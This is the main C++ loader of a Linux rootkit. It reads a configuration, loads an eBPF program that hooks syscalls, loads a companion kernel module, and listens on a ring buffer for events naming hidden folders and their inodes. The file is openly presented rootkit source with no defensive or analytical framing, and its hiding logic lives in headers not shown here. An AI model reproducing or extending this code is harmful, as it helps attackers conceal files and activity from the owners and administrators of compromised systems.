#include "common.h"
#include "rootkit/ConfigManager.hpp"
#include "rootkit/KernelModuleHelper.hpp"
#include "rootkit/RootkitBpfHelper.hpp"

#include <csignal>
#include <iostream>
#include <optional>
#include <sys/stat.h>

static volatile bool exiting = false;
static void sig_handler(int) { exiting = true; }

static int rb_event(void * ctx, void * data, size_t data_sz) {
    const struct event * e = reinterpret_cast<const struct event *>(data);
    printf("Hidden Folder: %s, inode: %llu\n", (char *)e->filename, e->inode);
    return 0;
}

int main(int argc, char ** argv) {
    // Set signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    rootkit::ConfigManager confManager(0);
    if (!confManager.read()) {
        std::cerr << "Couldn't read the config" << std::endl;
        return 1;
    }

    // Load bpf program and its syscalls
    rootkit::RootkitBpfHelper rootkit(confManager.get_bpf_config().value(), rb_event);
    // Load kernel module
    rootkit::KernelModuleHelper module(confManager.get_kernel_module_config().value(), DEV_NAME);

    std::cout << "listening for events... Ctrl-C to exit\n";

    // Get data from ring buffer till exit signal or error
    while (!exiting) {
        rootkit.rb_poll(1000);
        if (rootkit.status() != std::nullopt) {
            break;
        }
    }

    return 0;
}
